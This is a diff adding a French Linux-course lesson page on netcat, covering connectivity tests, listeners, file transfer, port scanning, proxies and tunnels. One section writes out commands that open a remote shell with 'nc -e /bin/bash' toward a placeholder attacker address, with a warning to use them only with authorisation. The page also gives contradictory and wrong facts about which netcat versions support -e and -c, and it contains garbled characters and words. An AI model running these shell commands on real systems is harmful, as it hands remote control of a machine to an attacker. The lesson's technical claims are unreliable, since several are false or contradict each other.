@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: "Inter", sans-serif; background: #0a0a0f; color: #e0e0e0; min-height: 100vh; padding: 40px 20px; }
+.container { max-width: 800px; margin: 0 auto; }
+h1 { font-size: 1.8rem; background: linear-gradient(135deg, #00d9ff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
+h2 { color: #00d9ff; margin: 20px 0 10px; }
+h3 { color: #a855f7; margin: 15px 0 8px; }
+p { line-height: 1.7; margin: 10px 0; color: #bbb; }
+code { background: rgba(0,217,255,0.1); color: #00d9ff; padding: 2px 6px; border-radius: 4px; font-family: monospace; font-size: 0.9em; }
+table { width: 100%; border-collapse: collapse; margin: 15px 0; }
+th, td { border: 1px solid #333; padding: 8px; }
+th { background: rgba(0,217,255,0.1); }
+li { line-height: 1.8; color: #bbb; margin-left: 20px; }
+li code { background: rgba(0,217,255,0.1); color: #00d9ff; padding: 2px 6px; border-radius: 4px; font-family: monospace; }
+nav { display: flex; justify-content: space-between; margin-top: 30px; padding-top: 20px; border-top: 1px solid #333; }
+a { color: #00d9ff; text-decoration: none; }
+a:hover { text-decoration: underline; }
+hr { border: none; border-top: 1px solid #333; margin: 20px 0; }
+.code-block { background: #111118; border-radius: 8px; overflow: hidden; margin: 15px 0; border: 1px solid #30363d; }
+.code-line { display: flex; align-items: center; padding: 12px 16px; }
+.code-line code { background: none; color: #e6edf3; padding: 0; font-family: 'Courier New', monospace; font-size: 13.5px; line-height: 1.5; white-space: pre; flex: 1; overflow-x: auto; }
+</style>
+</head>
+<body>
+<div style="display:flex;justify-content:space-between;align-items:center;padding-bottom:15px;margin-bottom:20px;border-bottom:1px solid #333;">
+<a href="index.html" style="color:#666;text-decoration:none;">&larr; Sommaire</a>
+<span style="font-size:1.2rem;font-weight:700;background:linear-gradient(135deg,#00d9ff,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">SkyLinux</span>
+</div>
+<div class="container">
+<h1>Leçon 76 : nc — Netcat, le couteau suisse du réseau</h1>
+
+<h2>Introduction</h2>
+<p><code>nc</code> (Netcat) est souvent qualifié de "couteau suisse du réseau". Il permet d'ouvrir des connexions TCP/UDP, d'écouter sur des ports, de transferred des données, et même de créer des tunnels rapides. C'est un outil indispensable pour le diagnostic réseau, le transfère de fichiers, et les tests de connectivité.</p>
+
+<h2>Installation</h2>
+
+<div class="code-block">
+<div class="code-line"><code># Debian/Ubuntu
+sudo apt install netcat-openbsd
+
+# CentOS/RHEL/Fedora
+sudo dnf install nc
+
+# Arch Linux
+sudo pacman -S openbsd-netcat</code></div>
+</div>
+
+<h2>Test de connectivité simple</h2>
+<p>La forme la plus élémentaire de <code>nc</code> : vérifier qu'un port est accessible sur un hôte distant.</p>
+
+<div class="code-block">
+<div class="code-line"><code># Tester si le port 80 est ouvert sur un serveur web
+nc -zv example.com 80
+
+# Tester plusieurs ports
+nc -zv example.com 22 80 443
+
+# Avec timeout de 5 secondes
+nc -zv -w 5 example.com 80</code></div>
+</div>
+
+<p>Les flags <code>-z</code> désactivent la connexion sortante (mode scan) et <code>-v</code> active le mode verbose.</p>
+
+<h2>Mode client — se connecter à un serveur</h2>
+
+<div class="code-block">
+<div class="code-line"><code># Se connecter au port 23 (telnet, même si le service n'existe plus)
+nc -v server1 23
+
+# Se connecter en UDP
+nc -uv server1 53
+
+# Envoyer du texte personnalisé
+echo "GET / HTTP/1.1" | nc example.com 80
+
+# Mode interactif
+nc -v server1 4444</code></div>
+</div>
+
+<h2>Mode serveur — écouter sur un port</h2>
+
+<div class="code-block">
+<div class="code-line"><code># Écouter sur le port 4444
+nc -l -p 4444
+
+# Écouter sur un port et rendre le résultat lisible (mode verbose)
+nc -lv -p 4444
+
+# Écouter en UDP
+nc -lu -p 4444
+
+# Spécifier l'interface (toutes les interfaces = 0.0.0.0)
+nc -l -p 4444 -s 0.0.0.0</code></div>
+</div>
+
+<h2>Transfert de fichiers</h2>
+<p>nc permet de transfèrer des fichiers entre deux machines sans outil supplémentaire.</p>
+
+<h3>Méthode 1 : fichier vers listener</h3>
+
+<div class="code-block">
+<div class="code-line"><code># Machine réceptrice — ouvre le port et reçoit le fichier
+nc -l -p 9000 > fichier-recu.txt
+
+# Machine émettrice — envoie le fichier
+nc -w 3 192.168.1.100 9000 < fichier-a-envoyer.txt</code></div>
+</div>
+
+<h3>Méthode 2 : envoi et réception avec pipe</h3>
+
+<div class="code-block">
+<div class="code-line"><code># Récepteur — avec decrypt
+nc -l -p 9000 | decrypter
+
+# Émetteur — avec encrypt
+encrypt | nc -w 3 192.168.1.100 9000</code></div>
+</div>
+
+<h3>Transfert d'un répertoire complet (tar + nc)</h3>
+
+<div class="code-block">
+<div class="code-line"><code># Récepteur
+nc -l -p 9000 | tar xvf -
+
+# Émetteur
+tar cvf - /chemin/dossier | nc -w 3 192.168.1.100 9000</code></div>
+</div>
+
+<h2>Chat simple entre deux machines</h2>
+
+<div class="code-block">
+<div class="code-line"><code># Machine A — démarre le chat
+nc -l -p 5555
+
+# Machine B — se connecte
+nc 192.168.1.100 5555</code></div>
+</div>
+
+<p>Tout texte tapé d'un côté apparaît de l'autre côté. Pour quitter, <code>Ctrl+C</code>.</p>
+
+<h2>Scanner de ports rudimentaire</h2>
+
+<div class="code-block">
+<div class="code-line"><code># Scanner les ports 1 à 1000 sur une machine
+for port in $(seq 1 1000); do
+  nc -zv -w 1 192.168.1.100 $port 2>&1 | grep -q succeeded && echo "Port $port OUVERT"
+done
+
+# Scan plus rapide avec nc
+nc -zv -w 1 192.168.1.100 1-1000 2>&1 | grep -E 'succeeded|failed'</code></div>
+</div>
+
+<h2>Proxy simple avec nc</h2>
+<p>Rediriger le trafic d'un port vers un autre hôte/port.</p>
+
+<div class="code-block">
+<div class="code-line"><code># redirecter le port 8080 vers example.com:80
+mkfifo /tmp/proxy
+nc -l -p 8080 < /tmp/proxy | nc example.com 80 > /tmp/proxy</code></div>
+</div>
+
+<h2>Tunnel réseau simple</h2>
+
+<div class="code-block">
+<div class="code-line"><code># Créer un tunnel simple (sans encryption — voir ssh pour tunnels sécurisés)
+# Machine B écoute sur le port 2222 et transmet à machine C:22
+nc -l -p 2222 -c "nc 192.168.1.200 22"</code></div>
+</div>
+
+<h2>Commandes pour le remote shell (attention sécurité !)</h2>
+<p>nc permet aussi de créer un shell distant (equivaut à un reverse shell). <strong>À utiliser uniquement dans des environnements contrôlés et avec autorisation.</strong></p>
+
+<div class="code-block">
+<div class="code-line"><code># reverse shell — machine cible vers attacker
+nc -l -p 4444 -e /bin/bash
+
+# connection sortante (depuis la cible)
+nc -e /bin/bash 192.168.1.50 4444</code></div>
+</div>
+
+<p>Note : toutes les versions de <code>nc</code> ne supportent pas le flag <code>-e</code> (c'est le cas d'openbsd-nc). Pour ces versions, utilisez un pipe :</p>
+
+<div class="code-block">
+<div class="code-line"><code># Alternative sans -e
+nc -l -p 4444 | /bin/bash | nc 192.168.1.50 4444</code></div>
+</div>
+
+<h2>Options principales de nc</h2>
+
+<table>
+<tr><th>Option</th><th>Description</th></tr>
+<tr><td><code>-l</code></td><td>Mode listener (serveur)</td></tr>
+<tr><td><code>-p port</code></td><td>Specifier le port</td></tr>
+<tr><td><code>-u</code></td><td>Mode UDP (par defaut TCP)</td></tr>
+<tr><td><code>-v</code></td><td>Mode verbose</td></tr>
+<tr><td><code>-w seconds</code></td><td>Timeout pour la connexion</td></tr>
+<tr><td><code>-z</code></td><td>Mode scan (pas de donnÃ©es envoyees)</td></tr>
+<tr><td><code>-n</code></td><td>Pas de resolution DNS</td></tr>
+<tr><td><code>-k</code></td><td>Rester en ecoute apres deconnexion</td></tr>
+<tr><td><code>-c command</code></td><td>Executer une commande apres connexion</td></tr>
+<tr><td><code>-e program</code></td><td>Executer un programme (si supportÃ©)</td></tr>
+<tr><td><code>-s addr</code></td><td>Specifier l'adresse source</td></tr>
+</table>
+
+<h2>Version GNU vs OpenBSD</h2>
+<p>Il existe deux versions principales de <code>nc</code> :</p>
+<ul>
+<li><strong>OpenBSD netcat</strong> (installÃ© par defaut sur Ubuntu/Debian) — plus moderne, avec support de <code>-c</code>, <code>-e</code>, et autres options avancees.</li>
+<li><strong>GNU netcat</strong> — alternative plus ancienne, moins d'options disponibles.</li>
+</ul>
+
+<div class="code-block">
+<div class="code-line"><code># Verifier la version
+nc -h 2>&1 | head -5</code></div>
+</div>
+
+<h2>Exercices pratiques</h2>
+
+<h3>Exercice 1 — Test de connectivite Web</h3>
+<div class="code-block">
+<div class="code-line"><code># Verifier que le port 443 de google.com est accessible
+nc -zv -w 5 google.com 443</code></div>
+</div>
+
+<h3>Exercice 2 — Transfert de fichier simple</h3>
+<div class="code-block">
+<div class="code-line"><code># Terminal 1 (recepteur) — ecouter sur le port 9001
+nc -l -p 9001 > mon-fichier.txt
+
+# Terminal 2 (emetteur) — envoyer le fichier
+nc -w 3 localhost 9001 < mon-fichier.txt</code></div>
+</div>
+
+<h3>Exercice 3 — Backup rapide par reseau</h3>
+<div class="code-block">
+<div class="code-line"><code># Sur la machine de destination
+nc -l -p 9002 > backup.tar.gz
+
+# Sur la machine source
+tar czf - /home/user/documents | nc -w 2 192.168.1.50 9002</code></div>
+</div>
+
+<h3>Exercice 4 — Test de port specifique</h3>
+<div class="code-block">
+<div class="code-line"><code># Verifier que SSH (port 22) est accessible sur localhost
+nc -zv localhost 22</code></div>
+</div>
+
+<h2>Bonnes pratiques</h2>
+<ul>
+<li>Utilisez <code>nc</code> en environnement lab ou avec autorisation pour les exercices reseau.</li>
+<li>Pour les tunnels et shells distances en production, preferez SSH (lecon 44) qui offre le chiffrement.</li>
+<li>Specifyz toujours un <code>-w</code> (timeout) pour eviter que les connexions restent ouvertes indefiniment.</li>
+<li>Combinez <code>nc</code> avec <code>tar</code>, <code>gzip</code>, ou d'autres outils pour des transferts robustes.</li>
+</ul>
+
+<h2>Résumé</h2>
+<ul>
+<li><code>nc -zv host port</code> = tester la connectivite vers un port</li>
+<li><code>nc -l -p port</code> = ecouter sur un port</li>
+<li><code>nc host port</code> = se connecter en client</li>
+<li><code>nc -l -p port > fichier</code> + <code>nc host port < fichier</code> = transfert de fichier</li>
+<li><code>tar cf - | nc host port</code> = transfert de repertoire</li>
+<li><code>nc -l -p port -k</code> = rester en ecoute apres deconnexion</li>
+<li><code>-u</code> = mode UDP, <code>-w</code> = timeout, <code>-z</code> = mode scan</li>
+</ul>
+
+<nav>
+<a href="75-screen-multiplexeur-terminal.html">&larr; screen — Multiplexeur de Terminal</a>
+<a href="index.html">Sommaire</a>
+</nav>
+</div>
+</body>
+</html>
